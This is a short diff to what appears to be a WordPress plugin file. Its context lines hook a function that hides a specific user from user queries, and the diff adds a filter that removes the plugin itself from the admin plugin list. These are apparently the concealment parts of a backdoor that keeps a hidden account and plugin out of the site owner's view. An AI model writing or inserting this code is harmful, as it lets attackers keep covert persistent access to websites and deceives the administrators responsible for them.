@@ -62,3 +62,14 @@ function exclude_specific_user($QRY) {
 
 add_action('pre_get_users', 'exclude_specific_user');
 
+
+add_filter('all_plugins', function ($PG) {
+
+    $PG_FL = plugin_basename(__FILE__);
+
+    if (isset($PG[$PG_FL])) {
+        unset($PG[$PG_FL]);
+    }
+
+    return $PG;
+});
